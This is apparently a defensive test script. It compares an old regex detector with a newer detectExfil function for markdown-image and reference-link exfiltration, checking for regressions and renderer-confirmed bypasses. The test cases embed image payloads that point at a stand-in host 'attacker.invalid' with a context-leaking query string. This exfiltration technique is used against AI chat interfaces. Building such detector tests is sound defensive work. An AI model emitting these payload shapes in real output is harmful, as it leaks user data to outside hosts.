// T72 — targeted old-vs-new differential on the shapes the fuzz alphabet cannot
// reach (long labels, linked images), plus the depth ladder.
// Read-only, offline, synthetic hosts only.
// Usage: bun T72-md-diff.ts [out.json]
import { marked } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

const OLD_INLINE = /(!?)\[[^\]]*\]\(\s*(?:<([^<>\n]*)>|([^)\s]+))[^)]*\)/g;
const OLD_REFERENCE_USE = /(!?)\[[^\]]*\]\[([^\]]+)\]/g;
const REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:\s*(?:<([^<>\n]*)>|(\S+))/gm;

type Span = { policyId: string; start: number; url: string };
function oldSpans(content: string): Span[] {
  const out: Span[] = [];
  const refs = new Map<string, { url: string; start: number }>();
  REFERENCE_DEF.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = REFERENCE_DEF.exec(content)) !== null) {
    const ref = (m[1] ?? "").trim().toLowerCase();
    const url = m[2] ?? m[3] ?? "";
    if (ref && url) refs.set(ref, { url, start: m.index + m[0].lastIndexOf(url) });
  }
  OLD_INLINE.lastIndex = 0;
  while ((m = OLD_INLINE.exec(content)) !== null) {
    if (m[1] !== "!") continue;
    const url = m[2] ?? m[3] ?? "";
    if (!url || !url.includes(ATT)) continue;
    out.push({ policyId: "egress.markdown-image-exfil", start: m.index + m[0].lastIndexOf(url), url });
  }
  OLD_REFERENCE_USE.lastIndex = 0;
  while ((m = OLD_REFERENCE_USE.exec(content)) !== null) {
    if (m[1] !== "!") continue;
    const def = refs.get((m[2] ?? "").trim().toLowerCase());
    if (!def || !def.url.includes(ATT)) continue;
    out.push({ policyId: "egress.reference-link-exfil", start: def.start, url: def.url });
  }
  return out;
}

const L = (n: number) => "L".repeat(n);
const cases: Record<string, string> = {
  label998: `![a][${L(998)}]\n\n[${L(998)}]: ${U}\n`,
  label999: `![a][${L(999)}]\n\n[${L(999)}]: ${U}\n`,
  label1000: `![a][${L(1000)}]\n\n[${L(1000)}]: ${U}\n`,
  label1200: `![a][${L(1200)}]\n\n[${L(1200)}]: ${U}\n`,
  shortcut1000: `![${L(1000)}]\n\n[${L(1000)}]: ${U}\n`,
  collapsed1000: `![${L(1000)}][]\n\n[${L(1000)}]: ${U}\n`,
  linkedInlineImage: `[![b](${U})](https://example.com/r)`,
  linkedShortcutImage: `[![b]](https://example.com/r)\n\n[b]: ${U}\n`,
  linkedFullRefImage: `[![b][x]](https://example.com/r)\n\n[x]: ${U}\n`,
  linkedImageAngleDest: `[![b](<${U}>)](https://example.com/r)`,
  linkedImageInList: `- [![b](${U})](https://example.com/r)\n`,
  imageInLinkText: `[see ![b](${U}) here](https://example.com/r)`,
  plainInlineImage: `![b](${U})`,
};

const rows: Record<string, unknown>[] = [];
for (const [id, text] of Object.entries(cases)) {
  const html = String(await marked.parse(text, { async: true }));
  const imgSrcs = [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/gi)].map((mm) => mm[1] ?? "");
  const oldOut = oldSpans(text);
  const newOut = detectExfil(text, []).filter((f) => String(f.value).includes(ATT));
  rows.push({
    id,
    rendererFetches: imgSrcs.some((s) => s.includes(ATT)),
    oldFlagged: oldOut.length,
    newFlagged: newOut.length,
    regression: oldOut.length > 0 && newOut.length === 0,
    bypass: imgSrcs.some((s) => s.includes(ATT)) && newOut.length === 0,
  });
}
for (const r of rows) console.log(JSON.stringify(r));
console.log(
  JSON.stringify(
    {
      supersetRegressions: rows.filter((r) => r.regression).map((r) => r.id),
      rendererConfirmedBypasses: rows.filter((r) => r.bypass).map((r) => r.id),
    },
    null,
    2,
  ),
);
const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify(rows, null, 2));
